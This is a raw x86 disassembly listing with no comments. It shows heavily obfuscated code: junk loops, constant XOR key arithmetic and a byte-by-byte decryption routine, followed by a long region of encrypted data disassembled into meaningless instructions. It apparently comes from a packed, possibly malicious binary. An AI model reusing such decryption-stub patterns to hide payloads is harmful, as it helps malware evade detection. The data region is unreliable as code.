  415b23:	cmp    DWORD PTR ds:0x437717,0x6
  415b2a:	jle    0x415b70
  415b30:	jmp    0x415b51
  415b35:	push   DWORD PTR [ebp-0xc]
  415b38:	push   0x437042
  415b3d:	push   DWORD PTR [ebp-0x14]
  415b40:	push   0x4370f4
  415b45:	push   DWORD PTR [ebp-0x20]
  415b48:	push   DWORD PTR [ebp-0x20]
  415b4b:	call   DWORD PTR ds:0x43ca10
  415b51:	cmp    DWORD PTR ds:0x437717,0x5
  415b58:	jne    0x415b6b
  415b5e:	mov    ecx,DWORD PTR ds:0x437717
  415b64:	inc    ecx
  415b65:	mov    DWORD PTR ds:0x437717,ecx
  415b6b:	jmp    0x415b09
  415b70:	mov    DWORD PTR [ebp-0xc4],eax
  415b76:	mov    DWORD PTR [ebp-0x98],0xf89c8527
  415b80:	mov    DWORD PTR [ebp-0x90],0xf89c85bd
  415b8a:	and    DWORD PTR ds:0x43777b,0x0
  415b94:	jmp    0x415ba6
  415b99:	mov    ecx,DWORD PTR ds:0x43777b
  415b9f:	inc    ecx
  415ba0:	mov    DWORD PTR ds:0x43777b,ecx
  415ba6:	cmp    DWORD PTR ds:0x43777b,0x18
  415bad:	jae    0x415bda
  415bb3:	cmp    DWORD PTR ds:0x43777b,0x20
  415bba:	jb     0x415bda
  415bc0:	jmp    0x415bd5
  415bc5:	push   0x4b28
  415bca:	push   0x437737
  415bcf:	call   DWORD PTR ds:0x43c960
  415bd5:	jmp    0x415b99
  415bda:	mov    DWORD PTR [ebp-0xa0],0xf89c85b0
  415be4:	mov    DWORD PTR [ebp-0xa4],0xf89c85b3
  415bee:	mov    DWORD PTR [ebp-0x8c],0xf89c85b2
  415bf8:	or     DWORD PTR ds:0x43773f,edi
  415bfe:	mov    eax,DWORD PTR [ebp-0xa4]
  415c04:	mov    ecx,DWORD PTR ds:0x4377d3
  415c0a:	mov    ecx,DWORD PTR [ecx]
  415c0c:	sbb    DWORD PTR ds:0x437767,ecx
  415c12:	xor    eax,0x75108b5
  415c17:	add    DWORD PTR ds:0x4377a7,0x2ea0
  415c21:	add    eax,0x3272fb
  415c26:	mov    ecx,DWORD PTR ds:0x43779f
  415c2c:	sub    DWORD PTR ds:0x437743,ecx
  415c32:	mov    ecx,DWORD PTR [ebp-0xc4]
  415c38:	sub    ecx,eax
  415c3a:	mov    DWORD PTR ds:0x437767,0x6669
  415c44:	mov    DWORD PTR [ebp-0x94],ecx
  415c4a:	mov    DWORD PTR [ebp-0x9c],0xf89c85bf
  415c54:	mov    DWORD PTR ds:0x4377b3,0x3984
  415c5e:	cmp    DWORD PTR [ebp-0x8c],0xf89c85b0
  415c68:	mov    DWORD PTR ds:0x437797,0x4ae3
  415c72:	je     0x416422
  415c78:	mov    eax,DWORD PTR [ebp-0xa4]
  415c7e:	neg    ecx
  415c80:	xor    eax,0x75108b5
  415c85:	mov    ecx,DWORD PTR [ebp-0xa4]
  415c8b:	xor    ecx,0x75108b5
  415c91:	adc    DWORD PTR ds:0x4377a7,0x380b
  415c9b:	lea    ecx,[eax+ecx*1+0x64e5f6]
  415ca2:	mov    eax,DWORD PTR [ebp-0x94]
  415ca8:	xor    edx,edx
  415caa:	div    ecx
  415cac:	mov    eax,DWORD PTR [ebp-0x8c]
  415cb2:	add    DWORD PTR ds:0x43774b,ebx
  415cb8:	xor    eax,0x75108b5
  415cbd:	and    DWORD PTR ds:0x437713,0x450a
  415cc7:	add    eax,0x3272fb
  415ccc:	mov    ecx,DWORD PTR [ebp-0xa4]
  415cd2:	xor    ecx,0x75108b5
  415cd8:	add    ecx,0x3272fb
  415cde:	and    DWORD PTR ds:0x437773,0x437743
  415ce8:	sub    eax,ecx
  415cea:	cmp    edx,eax
  415cec:	jne    0x4160ed
  415cf2:	sbb    eax,0x28b5
  415cf7:	mov    eax,DWORD PTR [ebp-0x8]
  415cfa:	xor    DWORD PTR ds:0x43774f,0x2b4e
  415d04:	add    eax,DWORD PTR [ebp-0x94]
  415d0a:	sbb    DWORD PTR ds:0x4377b7,0x43775f
  415d14:	mov    al,BYTE PTR [eax]
  415d16:	mov    BYTE PTR [ebp-0xb9],al
  415d1c:	sub    DWORD PTR ds:0x43771f,ebx
  415d22:	mov    eax,DWORD PTR [ebp-0xa0]
  415d28:	or     DWORD PTR ds:0x4377a3,0x437787
  415d32:	xor    eax,0x75108b5
  415d37:	add    eax,0x3272fb
  415d3c:	mov    DWORD PTR ds:0x43770f,0x2af0
  415d46:	mov    DWORD PTR [ebp-0xc0],eax
  415d4c:	mov    DWORD PTR ds:0x437777,0x3812
  415d56:	jmp    0x415d7c
  415d5b:	sbb    DWORD PTR ds:0x437727,0x43779f
  415d65:	mov    eax,DWORD PTR [ebp-0xc0]
  415d6b:	and    DWORD PTR ds:0x437717,0x4377b3
  415d75:	inc    eax
  415d76:	mov    DWORD PTR [ebp-0xc0],eax
  415d7c:	sub    eax,0x6bb3
  415d81:	mov    eax,DWORD PTR [ebp-0x9c]
  415d87:	add    DWORD PTR ds:0x43774f,0x4377bb
  415d91:	xor    eax,0x75108b5
  415d96:	xor    DWORD PTR ds:0x437777,0x2bbf
  415da0:	add    eax,0x3272fb
  415da5:	mov    DWORD PTR ds:0x437737,0x7b12
  415daf:	cmp    DWORD PTR [ebp-0xc0],eax
  415db5:	jae    0x415f32
  415dbb:	inc    ecx
  415dbc:	mov    eax,DWORD PTR [ebp-0xc0]
  415dc2:	sub    eax,0x3272fb
  415dc7:	add    DWORD PTR ds:0x43778f,0x4ea7
  415dd1:	xor    eax,0x75108b5
  415dd6:	or     ecx,DWORD PTR ds:0x43772f
  415ddc:	add    eax,0x7f55d8f2
  415de1:	mov    ecx,0x39f3
  415de6:	mov    ecx,DWORD PTR [ebp-0xc0]
  415dec:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415df3:	mov    DWORD PTR ds:0x43774b,edx
  415df9:	mov    eax,DWORD PTR [ebp-0xc0]
  415dff:	cmp    DWORD PTR [ebp+eax*4-0xb8],0x244ecb9d
  415e0a:	mov    DWORD PTR ds:0x437753,0x65ed
  415e14:	jbe    0x415e94
  415e1a:	mov    DWORD PTR ds:0x437763,0xe32
  415e24:	mov    eax,DWORD PTR [ebp-0xc0]
  415e2a:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415e31:	and    DWORD PTR ds:0x43773f,0x0
  415e3b:	mov    ecx,DWORD PTR ds:0x43773f
  415e41:	inc    ecx
  415e42:	mov    DWORD PTR ds:0x43773f,ecx
  415e48:	cmp    DWORD PTR ds:0x43773f,0x2b
  415e4f:	jbe    0x415e77
  415e55:	jmp    0x415e6a
  415e5a:	push   0x437094
  415e5f:	push   0x437094
  415e64:	call   DWORD PTR ds:0x43c964
  415e6a:	cmp    DWORD PTR ds:0x43773f,0x1e
  415e71:	jb     0x415e3b
  415e77:	add    eax,0x405fcdc
  415e7c:	mov    ecx,DWORD PTR ds:0x4377a7
  415e82:	mov    ecx,DWORD PTR [ebp-0xc0]
  415e88:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415e8f:	jmp    0x415f23
  415e94:	and    ecx,DWORD PTR ds:0x43775b
  415e9a:	mov    eax,DWORD PTR [ebp-0xc0]
  415ea0:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415ea7:	and    DWORD PTR ds:0x4377bb,0x0
  415eb1:	jmp    0x415ec3
  415eb6:	mov    ecx,DWORD PTR ds:0x4377bb
  415ebc:	inc    ecx
  415ebd:	mov    DWORD PTR ds:0x4377bb,ecx
  415ec3:	cmp    DWORD PTR ds:0x4377bb,0x1b
  415eca:	jae    0x415f0c
  415ed0:	cmp    DWORD PTR ds:0x4377bb,0x5
  415ed7:	ja     0x415f0c
  415edd:	jmp    0x415eed
  415ee2:	push   0x4370a4
  415ee7:	call   DWORD PTR ds:0x43c968
  415eed:	cmp    DWORD PTR ds:0x4377bb,0x4
  415ef4:	jne    0x415f07
  415efa:	mov    ecx,DWORD PTR ds:0x4377bb
  415f00:	inc    ecx
  415f01:	mov    DWORD PTR ds:0x4377bb,ecx
  415f07:	jmp    0x415eb6
  415f0c:	sub    eax,0x250bcdc
  415f11:	mov    ecx,0x72b4
  415f16:	mov    ecx,DWORD PTR [ebp-0xc0]
  415f1c:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415f23:	mov    DWORD PTR ds:0x4377b7,0x3b3c
  415f2d:	jmp    0x415d5b
  415f32:	xor    eax,eax
  415f34:	mov    DWORD PTR ds:0x43779b,0x35fa
  415f3e:	jne    0x415f77
  415f44:	and    eax,0x5148
  415f49:	movzx  eax,BYTE PTR [ebp-0xb9]
  415f50:	xor    eax,0x83
  415f55:	sbb    DWORD PTR ds:0x437797,0x43771b
  415f5f:	add    eax,0x8
  415f62:	mov    DWORD PTR ds:0x4377ab,0x5d96
  415f6c:	mov    BYTE PTR [ebp-0xb9],al
  415f72:	jmp    0x4160c6
  415f77:	and    DWORD PTR ds:0x4377af,0x0
  415f81:	jmp    0x415f93
  415f86:	mov    ecx,DWORD PTR ds:0x4377af
  415f8c:	inc    ecx
  415f8d:	mov    DWORD PTR ds:0x4377af,ecx
  415f93:	cmp    DWORD PTR ds:0x4377af,0x1a
  415f9a:	jae    0x415fd5
  415fa0:	cmp    DWORD PTR ds:0x4377af,0x1e
  415fa7:	jl     0x415fd5
  415fad:	jmp    0x415fd0
  415fb2:	push   DWORD PTR [ebp-0x14]
  415fb5:	push   0x43772f
  415fba:	push   DWORD PTR [ebp-0x20]
  415fbd:	push   0x43716e
  415fc2:	push   DWORD PTR [ebp-0x28]
  415fc5:	push   0x6705
  415fca:	call   DWORD PTR ds:0x43c96c
  415fd0:	jmp    0x415f86
  415fd5:	mov    eax,DWORD PTR [ebp-0x98]
  415fdb:	and    DWORD PTR ds:0x437757,0x0
  415fe5:	jmp    0x415ff7
  415fea:	mov    ecx,DWORD PTR ds:0x437757
  415ff0:	inc    ecx
  415ff1:	mov    DWORD PTR ds:0x437757,ecx
  415ff7:	cmp    DWORD PTR ds:0x437757,0x1b
  415ffe:	jae    0x416043
  416004:	cmp    DWORD PTR ds:0x437757,0x9
  41600b:	jge    0x416043
  416011:	jmp    0x416024
  416016:	push   0x43770f
  41601b:	push   DWORD PTR [ebp-0x18]
  41601e:	call   DWORD PTR ds:0x43c970
  416024:	cmp    DWORD PTR ds:0x437757,0x8
  41602b:	jne    0x41603e
  416031:	mov    ecx,DWORD PTR ds:0x437757
  416037:	inc    ecx
  416038:	mov    DWORD PTR ds:0x437757,ecx
  41603e:	jmp    0x415fea
  416043:	xor    eax,0x75108b5
  416048:	mov    ecx,DWORD PTR ds:0x437743
  41604e:	add    DWORD PTR ds:0x4377b7,ecx
  416054:	add    eax,0x3272fb
  416059:	mov    ecx,DWORD PTR ds:0x437727
  41605f:	add    DWORD PTR ds:0x43771f,ecx
  416065:	movzx  ecx,BYTE PTR [ebp-0xb9]
  41606c:	sub    ecx,eax
  41606e:	mov    BYTE PTR [ebp-0xb9],cl
  416074:	adc    DWORD PTR ds:0x43779f,0x43771f
  41607e:	mov    ecx,DWORD PTR [ebp-0x90]
  416084:	xor    DWORD PTR ds:0x43773f,0x437753
  41608e:	xor    ecx,0x75108b5
  416094:	adc    DWORD PTR ds:0x437727,0x43774f
  41609e:	add    ecx,0x3272fb
  4160a4:	mov    al,BYTE PTR [ebp-0xb9]
  4160aa:	and    DWORD PTR ds:0x43771f,0x6ab7
  4160b4:	ror    al,cl
  4160b6:	sub    DWORD PTR ds:0x43770f,0x1214
  4160c0:	mov    BYTE PTR [ebp-0xb9],al
  4160c6:	sub    DWORD PTR ds:0x43778f,0x437757
  4160d0:	xor    eax,eax
  4160d2:	mov    eax,DWORD PTR [ebp-0x8]
  4160d5:	add    eax,DWORD PTR [ebp-0x94]
  4160db:	or     DWORD PTR ds:0x437717,0x5827
  4160e5:	mov    cl,BYTE PTR [ebp-0xb9]
  4160eb:	mov    BYTE PTR [eax],cl
  4160ed:	mov    eax,DWORD PTR [ebp-0x94]
  4160f3:	sub    DWORD PTR ds:0x43771b,0x437777
  4160fd:	sub    eax,0x3272fb
  416102:	sub    DWORD PTR ds:0x437777,0x76d0
  41610c:	xor    eax,0x75108b5
  416111:	mov    DWORD PTR ds:0x43773f,0x3e21
  41611b:	cmp    eax,DWORD PTR [ebp-0xa0]
  416121:	mov    DWORD PTR ds:0x437797,0x79e9
  41612b:	jne    0x416341
  416131:	mov    eax,DWORD PTR [ebp-0x8c]
  416137:	xor    eax,0x75108b5
  41613c:	add    eax,0x3272fb
  416141:	mov    ecx,DWORD PTR ds:0x43771b
  416147:	adc    DWORD PTR ds:0x43772f,ecx
  41614d:	mov    ecx,DWORD PTR [ebp-0xa4]
  416153:	and    DWORD PTR ds:0x43779b,0x4377bb
  41615d:	xor    ecx,0x75108b5
  416163:	add    ecx,0x3272fb
  416169:	sub    eax,ecx
  41616b:	and    DWORD PTR ds:0x437793,0x0
  416175:	mov    ecx,DWORD PTR ds:0x437793
  41617b:	inc    ecx
  41617c:	mov    DWORD PTR ds:0x437793,ecx
  416182:	cmp    DWORD PTR ds:0x437793,0x2b
  416189:	jbe    0x4161c3
  41618f:	jmp    0x4161b6
  416194:	push   0x170b
  416199:	push   0x43772f
  41619e:	push   DWORD PTR [ebp-0x1c]
  4161a1:	push   0x437061
  4161a6:	push   0x5827
  4161ab:	push   0x27a3
  4161b0:	call   DWORD PTR ds:0x43c978
  4161b6:	cmp    DWORD PTR ds:0x437793,0x1d
  4161bd:	jb     0x416175
  4161c3:	sub    eax,0x3272fb
  4161c8:	xor    eax,0x75108b5
  4161cd:	and    DWORD PTR ds:0x437713,0x0
  4161d7:	mov    ecx,DWORD PTR ds:0x437713
  4161dd:	inc    ecx
  4161de:	mov    DWORD PTR ds:0x437713,ecx
  4161e4:	cmp    DWORD PTR ds:0x437713,0x9
  4161eb:	jle    0x41623d
  4161f1:	jmp    0x416216
  4161f6:	push   0x437094
  4161fb:	push   DWORD PTR [ebp-0x14]
  4161fe:	push   0x6d50
  416203:	push   0x1b74
  416208:	push   DWORD PTR [ebp-0x18]
  41620b:	push   0x79a3
  416210:	call   DWORD PTR ds:0x43c97c
  416216:	cmp    DWORD PTR ds:0x437713,0x8
  41621d:	jne    0x416230
  416223:	mov    ecx,DWORD PTR ds:0x437713
  416229:	inc    ecx
  41622a:	mov    DWORD PTR ds:0x437713,ecx
  416230:	cmp    DWORD PTR ds:0x437713,0x19
  416237:	jb     0x4161d7
  41623d:	mov    DWORD PTR [ebp-0x8c],eax
  416243:	mov    eax,DWORD PTR [ebp-0xa4]
  416249:	and    DWORD PTR ds:0x43777f,0x0
  416253:	mov    ecx,DWORD PTR ds:0x43777f
  416259:	inc    ecx
  41625a:	mov    DWORD PTR ds:0x43777f,ecx
  416260:	cmp    DWORD PTR ds:0x43777f,0x10
  416267:	jb     0x4162ac
  41626d:	jmp    0x416285
  416272:	push   0x437042
  416277:	push   0x437089
  41627c:	push   DWORD PTR [ebp-0x24]
  41627f:	call   DWORD PTR ds:0x43c980
  416285:	cmp    DWORD PTR ds:0x43777f,0xf
  41628c:	jne    0x41629f
  416292:	mov    ecx,DWORD PTR ds:0x43777f
  416298:	inc    ecx
  416299:	mov    DWORD PTR ds:0x43777f,ecx
  41629f:	cmp    DWORD PTR ds:0x43777f,0x1f
  4162a6:	jb     0x416253
  4162ac:	xor    eax,0x75108b5
  4162b1:	mov    DWORD PTR ds:0x43779f,0x13
  4162bb:	cmp    DWORD PTR ds:0x43779f,0x0
  4162c2:	je     0x416323
  4162c8:	cmp    DWORD PTR ds:0x43779f,0x4
  4162cf:	jg     0x416323
  4162d5:	jmp    0x4162f5
  4162da:	push   0x664a
  4162df:	push   DWORD PTR [ebp-0x28]
  4162e2:	push   DWORD PTR [ebp-0xc]
  4162e5:	push   0x1a11
  4162ea:	push   0x533a
  4162ef:	call   DWORD PTR ds:0x43c984
  4162f5:	cmp    DWORD PTR ds:0x43779f,0x5
  4162fc:	jne    0x416311
  416302:	xor    ecx,ecx
  416304:	add    ecx,DWORD PTR ds:0x43779f
  41630a:	dec    ecx
  41630b:	mov    DWORD PTR ds:0x43779f,ecx
  416311:	mov    ecx,DWORD PTR ds:0x43779f
  416317:	dec    ecx
  416318:	mov    DWORD PTR ds:0x43779f,ecx
  41631e:	jmp    0x4162bb
  416323:	add    eax,0x3272fb
  416328:	sbb    ecx,DWORD PTR ds:0x437713
  41632e:	mov    ecx,DWORD PTR [ebp-0xc4]
  416334:	sub    ecx,eax
  416336:	mov    DWORD PTR [ebp-0x94],ecx
  41633c:	jmp    0x41641d
  416341:	mov    DWORD PTR ds:0x43774b,0x19
  41634b:	cmp    DWORD PTR ds:0x43774b,0x0
  416352:	je     0x416387
  416358:	cmp    DWORD PTR ds:0x43774b,0x1e
  41635f:	ja     0x416387
  416365:	jmp    0x416373
  41636a:	push   DWORD PTR [ebp-0x18]
  41636d:	call   DWORD PTR ds:0x43c988
  416373:	xor    ecx,ecx
  416375:	add    ecx,DWORD PTR ds:0x43774b
  41637b:	dec    ecx
  41637c:	mov    DWORD PTR ds:0x43774b,ecx
  416382:	jmp    0x41634b
  416387:	mov    eax,DWORD PTR [ebp-0xa4]
  41638d:	and    ecx,DWORD PTR ds:0x437743
  416393:	xor    eax,0x75108b5
  416398:	and    DWORD PTR ds:0x4377af,0x0
  4163a2:	jmp    0x4163b4
  4163a7:	mov    ecx,DWORD PTR ds:0x4377af
  4163ad:	inc    ecx
  4163ae:	mov    DWORD PTR ds:0x4377af,ecx
  4163b4:	cmp    DWORD PTR ds:0x4377af,0x13
  4163bb:	jae    0x416400
  4163c1:	cmp    DWORD PTR ds:0x4377af,0x8
  4163c8:	jb     0x416400
  4163ce:	jmp    0x4163e1
  4163d3:	push   0x3598
  4163d8:	push   DWORD PTR [ebp-0x1c]
  4163db:	call   DWORD PTR ds:0x43c98c
  4163e1:	cmp    DWORD PTR ds:0x4377af,0x7
  4163e8:	jne    0x4163fb
  4163ee:	mov    ecx,DWORD PTR ds:0x4377af
  4163f4:	inc    ecx
  4163f5:	mov    DWORD PTR ds:0x4377af,ecx
  4163fb:	jmp    0x4163a7
  416400:	add    eax,0x3272fb
  416405:	mov    ecx,DWORD PTR [ebp-0x94]
  41640b:	sub    ecx,eax
  41640d:	mov    DWORD PTR ds:0x437753,0x2d68
  416417:	mov    DWORD PTR [ebp-0x94],ecx
  41641d:	jmp    0x415c54
  416422:	mov    eax,DWORD PTR [ebp-0x2c]
  416425:	mov    DWORD PTR ds:0x437763,0x1dfd
  41642f:	mov    DWORD PTR [ebp-0x100],eax
  416435:	or     DWORD PTR ds:0x437777,0x29f8
  41643f:	mov    DWORD PTR [ebp-0xd4],0xf89c8527
  416449:	mov    DWORD PTR [ebp-0xcc],0xf89c85bd
  416453:	mov    DWORD PTR [ebp-0xdc],0xf89c85b0
  41645d:	mov    eax,ds:0x43778f
  416462:	and    DWORD PTR ds:0x43776f,eax
  416468:	mov    DWORD PTR [ebp-0xe0],0xf89c85b3
  416472:	mov    DWORD PTR [ebp-0xc8],0xf89c85b2
  41647c:	mov    DWORD PTR ds:0x43776b,0x16
  416486:	cmp    DWORD PTR ds:0x43776b,0x0
  41648d:	je     0x4164e1
  416493:	cmp    DWORD PTR ds:0x43776b,0xa
  41649a:	jg     0x4164e1
  4164a0:	jmp    0x4164b5
  4164a5:	push   0x437797
  4164aa:	push   0x167f
  4164af:	call   DWORD PTR ds:0x43c990
  4164b5:	cmp    DWORD PTR ds:0x43776b,0xb
  4164bc:	jne    0x4164cf
  4164c2:	mov    ecx,DWORD PTR ds:0x43776b
  4164c8:	dec    ecx
  4164c9:	mov    DWORD PTR ds:0x43776b,ecx
  4164cf:	mov    ecx,DWORD PTR ds:0x43776b
  4164d5:	dec    ecx
  4164d6:	mov    DWORD PTR ds:0x43776b,ecx
  4164dc:	jmp    0x416486
  4164e1:	mov    eax,DWORD PTR [ebp-0xe0]
  4164e7:	xor    eax,0x75108b5
  4164ec:	xor    ecx,ecx
  4164ee:	xor    ecx,DWORD PTR ds:0x437713
  4164f4:	sbb    ecx,DWORD PTR ds:0x43774b
  4164fa:	mov    DWORD PTR ds:0x437713,ecx
  416500:	add    eax,0x3272fb
  416505:	mov    ecx,DWORD PTR [ebp-0x100]
  41650b:	and    DWORD PTR ds:0x437753,0x43772b
  416515:	sub    ecx,eax
  416517:	mov    DWORD PTR [ebp-0xd0],ecx
  41651d:	mov    DWORD PTR ds:0x43779f,0x77e5
  416527:	mov    DWORD PTR [ebp-0xd8],0xf89c85bf
  416531:	mov    DWORD PTR ds:0x4377bb,0x62a5
  41653b:	cmp    DWORD PTR [ebp-0xc8],0xf89c85b0
  416545:	mov    DWORD PTR ds:0x4377b7,0x2244
  41654f:	je     0x418baf
  416555:	mov    eax,DWORD PTR [ebp-0xe0]
  41655b:	xor    DWORD PTR ds:0x43775b,edx
  416561:	xor    eax,0x75108b5
  416566:	mov    ecx,DWORD PTR [ebp-0xe0]
  41656c:	sub    DWORD PTR ds:0x437747,0x6975
  416576:	xor    ecx,0x75108b5
  41657c:	lea    ecx,[eax+ecx*1+0x64e5f6]
  416583:	mov    eax,DWORD PTR [ebp-0xd0]
  416589:	adc    DWORD PTR ds:0x437723,0x43771b
  416593:	xor    edx,edx
  416595:	sub    DWORD PTR ds:0x437773,0x43778b
  41659f:	div    ecx
  4165a1:	and    DWORD PTR ds:0x437757,0x0
  4165ab:	jmp    0x4165bf
  4165b0:	xor    ecx,ecx
  4165b2:	xor    ecx,DWORD PTR ds:0x437757
  4165b8:	inc    ecx
  4165b9:	mov    DWORD PTR ds:0x437757,ecx
  4165bf:	cmp    DWORD PTR ds:0x437757,0x12
  4165c6:	jae    0x4165fc
  4165cc:	cmp    DWORD PTR ds:0x437757,0x14
  4165d3:	jg     0x4165fc
  4165d9:	jmp    0x4165f7
  4165de:	push   DWORD PTR [ebp-0x24]
  4165e1:	push   DWORD PTR [ebp-0x28]
  4165e4:	push   0x437094
  4165e9:	push   0x437061
  4165ee:	push   DWORD PTR [ebp-0x24]
  4165f1:	call   DWORD PTR ds:0x43c994
  4165f7:	jmp    0x4165b0
  4165fc:	mov    eax,DWORD PTR [ebp-0xc8]
  416602:	xor    eax,0x75108b5
  416607:	add    eax,0x3272fb
  41660c:	mov    ecx,DWORD PTR [ebp-0xe0]
  416612:	xor    ecx,0x75108b5
  416618:	add    ecx,0x3272fb
  41661e:	jmp    0x4189c4
  416623:	test   eax,0x60a2e213
  416628:	jb     0x416613
  41662a:	adc    dh,ah
  41662c:	or     BYTE PTR ds:[edi-0x32896f1b],0xb2
  416634:	xchg   ecx,eax
  416635:	jp     0x4166b2
  416637:	add    bl,BYTE PTR [eax-0x25048485]
  41663d:	add    eax,DWORD PTR [eax]
  41663f:	leave  
  416640:	out    0xea,al
  416642:	ret    0xdedf
  416645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416646:	hlt    
  416647:	repz iret 
  416649:	enter  0xccd7,0xd3
  41664d:	std    
  41664e:	repz (bad) 
  416650:	shr    cl,cl
  416652:	loopne 0x416652
  416654:	add    edi,edx
  416656:	in     al,0xfa
  416658:	add    dh,al
  41665a:	jmp    0xe2cd:0xfccbd8df
  416661:	out    dx,al
  416662:	out    0xcb,al
  416664:	repz rcl bl,cl
  416667:	in     eax,dx
  416668:	mov    bh,0xea
  41666a:	jmp    0xdfeb:0xdce9f1d1
  416671:	shl    al,1
  416673:	enter  0xe103,0xc7
  416677:	push   es
  416678:	ret    0xc7bc
  41667b:	sti    
  41667c:	add    BYTE PTR [ecx],al
  41667e:	or     al,0xd
  416680:	(bad)  
  416681:	fxch   st(1)
  416683:	test   eax,0xedb0cfdd
  416688:	icebp  
  416689:	ror    bl,1
  41668b:	(bad)  
  41668d:	fdiv   st,st(5)
  41668f:	icebp  
  416690:	mov    esi,0xfcd8d8df
  416695:	out    0xff,al
  416697:	sti    
  416698:	(bad)  
  41669a:	in     al,0xda
  41669c:	(bad)  
  41669d:	out    0xfe,al
  41669f:	int    0x13
  4166a1:	stc    
  4166a2:	into   
  4166a3:	shl    dl,1
  4166a5:	retf   
  4166a6:	mov    cl,0xec
  4166a8:	in     al,dx
  4166a9:	rcl    bh,1
  4166ab:	sar    BYTE PTR [edx-0x43334133],0xfb
  4166b2:	in     eax,dx
  4166b3:	ret    
  4166b4:	out    dx,al
  4166b5:	shl    ebp,1
  4166b7:	aam    0xfe
  4166b9:	pop    es
  4166ba:	call   0xe14323c0
  4166bf:	loope  0x4166a7
  4166c1:	or     al,0xc4
  4166c3:	test   eax,0xc6c5f0c3
  4166c8:	mov    al,0xb7
  4166ca:	retf   0xf8db
  4166cd:	mov    esi,0xedf5bdf7
  4166d2:	aad    0xef
  4166d4:	clc    
  4166d5:	loop   0x41669a
  4166d7:	ret    0x3d9
  4166da:	mul    edx
  4166dc:	aad    0xe
  4166de:	out    0xff,al
  4166e0:	clc    
  4166e1:	stc    
  4166e2:	loope  0x4166c1
  4166e4:	fsubp  st(6),st
  4166e6:	test   dh,0xc6
  4166e9:	test   al,0xd2
  4166eb:	shl    ebx,cl
  4166ed:	mov    dh,0xeb
  4166ef:	cmc    
  4166f0:	icebp  
  4166f1:	leave  
  4166f2:	stc    
  4166f3:	mov    esp,0xd1fd06df
  4166f8:	or     al,ch
  4166fa:	retf   
  4166fb:	push   es
  4166fc:	(bad)  
  4166fe:	aad    0xec
  416700:	dec    eax
  416702:	icebp  
  416703:	mov    edi,0xc6f1f0c6
  416708:	sar    ecx,cl
  41670a:	sti    
  41670b:	sti    
  41670c:	iret   
  41670d:	sti    
  41670e:	mov    edi,0xc3d6f9d7
  416713:	rol    cl,cl
  416715:	add    esi,ebx
  416717:	add    eax,0xead8f204
  41671c:	stc    
  41671d:	leave  
  41671e:	or     eax,0xdc02cd13
  416723:	ret    0xe1bc
  416726:	in     al,0xec
  416728:	mov    edx,0xebfbf5d8
  41672e:	out    dx,al
  41672f:	clc    
  416730:	(bad)  
  416731:	clc    
  416732:	fcmovnu st,st(5)
  416734:	aad    0xc6
  416736:	pop    es
  416737:	in     al,0xe6
  416739:	fsubr  st,st(2)
  41673b:	clc    
  41673c:	out    0xf9,al
  41673e:	cld    
  41673f:	fcmovu st,st(3)
  416741:	out    dx,eax
  416742:	stos   DWORD PTR es:[edi],eax
  416743:	jmp    0xf1ac:0xb2e6c7e3
  41674a:	loope  0x416724
  41674c:	int    0xe8
  41674e:	rcl    ch,cl
  416750:	(bad)  
  416751:	(bad)  
  416753:	loop   0x416716
  416755:	shl    edx,1
  416757:	in     al,dx
  416758:	mov    esp,0xc6dadfc7
  41675d:	jmp    0x416749
  41675f:	fucom  st(6)
  416761:	rol    edi,cl
  416763:	retf   
  416764:	lods   al,BYTE PTR ds:[esi]
  416765:	not    bl
  416767:	sti    
  416768:	cmc    
  416769:	shl    eax,cl
  41676b:	imul   cl
  41676d:	(bad)
  416770:	(bad)  
  416771:	mov    ebx,0xf8d8f2f0
  416776:	rcr    ecx,cl
  416778:	add    eax,0xd406d4d9
  41677d:	fcmove st,st(6)
  41677f:	(bad)
  416782:	shl    bl,cl
  416784:	lods   al,BYTE PTR ds:[esi]
  416785:	test   al,0xdd
  416787:	(bad)  
  416789:	(bad)  
  41678a:	iret   
  41678b:	cli    
  41678c:	mov    ebx,0xc8ebefd5
  416791:	cli    
  416792:	sar    eax,0xfc
  416795:	cmc    
  416796:	add    al,al
  416798:	in     eax,0xe6
  41679a:	fsubrp st(0),st
  41679c:	jmp    0x416789
  41679e:	out    0xfe,al
  4167a0:	fcmovne st,st(1)
  4167a2:	ret    0xcad7
  4167a5:	retf   
  4167a6:	aam    0xce
  4167a8:	loop   0x416795
  4167aa:	repnz lock mov bh,0xf2
  4167ae:	jmp    0x41677d
  4167b0:	mov    ecx,0xedd8f1ca
  4167b5:	(bad)  
  4167b7:	(bad)  
  4167b9:	xlat   BYTE PTR ds:[ebx]
  4167ba:	fldl2t 
  4167bc:	rcl    ebp,0xe7
  4167bf:	leave  
  4167c0:	or     bl,cl
  4167c2:	mov    esp,0xc2e0cad1
  4167c7:	int    0xca
  4167c9:	repz icebp 
  4167cb:	out    0xe4,al
  4167cd:	iret   
  4167ce:	mov    ebp,0xfad1b9be
  4167d3:	mov    esp,0xf2e2d5e0
  4167d8:	xlat   BYTE PTR ds:[ebx]
  4167d9:	cmc    
  4167da:	shr    eax,0xdc
  4167dd:	loop   0x4167eb
  4167df:	call   0xe2fd6ace
  4167e4:	mov    dl,0xad
  4167e6:	int    0xf2
  4167e8:	mov    ebx,0xdbf3c0d2
  4167ed:	in     eax,dx
  4167ee:	lock iret 
  4167f0:	mov    esi,0xfec0bcb9
  4167f5:	out    0xd0,al
  4167f7:	in     al,0xd8
  4167f9:	add    bl,cl
  4167fb:	lds    ecx,FWORD PTR [ecx]
  4167fd:	(bad)  
  4167ff:	(bad)
  416802:	loopne 0x4167ae
  416804:	out    0xae,al
  416806:	mov    cl,0xe6
  416808:	(bad)  
  416809:	mov    bl,0xd2
  41680b:	shl    esi,1
  41680d:	mov    ch,0xed
  41680f:	fcmovu st,st(6)
  416811:	shr    bh,cl
  416813:	inc    bl
  416815:	fsubrp st(1),st
  416817:	push   esi
  416819:	mov    BYTE PTR [esi],0x7
  41681c:	loope  0x416809
  41681e:	add    eax,0xcac0e7f4
  416823:	test   eax,0xb7aec0e5
  416828:	in     eax,0xce
  41682a:	(bad)  
  41682b:	sti    
  41682c:	mov    edi,0xf5f2d3ea
  416831:	fiadd  WORD PTR [eax]
  416833:	fcomp  st(6)
  416835:	sar    al,cl
  416837:	out    0xa,eax
  416839:	jmp    0x416826
  41683b:	loope  0x416832
  41683d:	(bad)  
  41683e:	(bad)  
